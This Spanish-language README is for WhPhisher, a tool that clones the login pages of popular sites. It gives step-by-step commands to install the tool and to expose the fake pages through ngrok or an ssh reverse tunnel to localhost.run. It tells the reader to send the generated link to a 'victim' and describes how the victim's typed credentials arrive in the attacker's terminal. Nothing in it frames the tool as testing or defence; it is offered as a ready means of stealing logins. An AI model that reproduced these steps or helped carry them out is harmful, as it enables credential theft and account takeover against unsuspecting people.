# WhPhisher

La mejor herramienta para hacer phishing con las páginas más famosas actualizadas.


# Probado en:

Termux, Kali Linux y debian


# Pasos

Para qué hayan menos probabilidades de que falle esta herramienta, se aconseja instalar la última versión de Termux, y Termux API.


# -- Como instalar --

`pkg install bash`

`pkg install git`

`git clone https://github.com/WhBeatZ/WhPhisher.git`

`cd WhPhisher`

`chmod +x *`

`bash requisitoswh.sh`

Esperar a que se instalen y automaticamente se inicia WhPhisher :D


[![Virtual-Box-VM-Dib-Vpuj-JG9.png](https://i.postimg.cc/K86wfbyL/Virtual-Box-VM-Dib-Vpuj-JG9.png)](https://postimg.cc/XrgsNTq7)

Elegir la página y esperar a que inicie el túneling.

[![Virtual-Box-VM-pqnlsb1ey-B.png](https://i.postimg.cc/gJJMyjfj/Virtual-Box-VM-pqnlsb1ey-B.png)](https://postimg.cc/mcvNBLZW)

# Solucion si no se genera el link o no funciona (2 soluciones)

# - - - Solucion 1 - - -


`Abrir nueva sesion`

`cd NgrokWh`

`chmod +x ngrokwh.sh`

`./ngrokwh.sh`

`y`

`ngrok http 8080`

Compartir el link que nos generó a la víctima :D

Ahora volvemos a la sesion principal, y si alguien puso sus datos, nos saldrán ahí :D 

-Imagenes de demstración:

[![Screenshot-20220116-091839.png](https://i.postimg.cc/HW92dXc7/Screenshot-20220116-091839.png)](https://postimg.cc/3WWpZyZK)


[![Screenshot-20220116-091856.png](https://i.postimg.cc/kGKQ8yVm/Screenshot-20220116-091856.png)](https://postimg.cc/V0s0PnBG)


[![Screenshot-20220116-091939.png](https://i.postimg.cc/KvKRJy2v/Screenshot-20220116-091939.png)](https://postimg.cc/tYjq4wJL)




# - - - Solucion 2 - - -

Pasos:

`Abrimos nueva sesión`

`cd`

`pkg install openssh -y`

`ssh -R 80:localhost:8080 nokey@localhost.run`

Compartir el link que se generó :D

# Como debería de quedar
- Lo verde tapa información personal 
- La flecha amarilla apunta al link que hay que compartir

[![Pics-Art-12-28-12-04-12.jpg](https://i.postimg.cc/Dw0djMxM/Pics-Art-12-28-12-04-12.jpg)](https://postimg.cc/yDqZWv4m)

# Resultado

- El link que le enviaste a la victima: 

[![chrome-NQpwa-Yi-Wxc.png](https://i.postimg.cc/mrxzN5JH/chrome-NQpwa-Yi-Wxc.png)](https://postimg.cc/k2cg7fnJ)

Cuando la víctima pone sus credenciales, nos llegan en la terminal:

[![Virtual-Box-VM-t1m8-G0-J0-MQ.png](https://i.postimg.cc/wjj0Y7jV/Virtual-Box-VM-t1m8-G0-J0-MQ.png)](https://postimg.cc/4mjzz4t7)


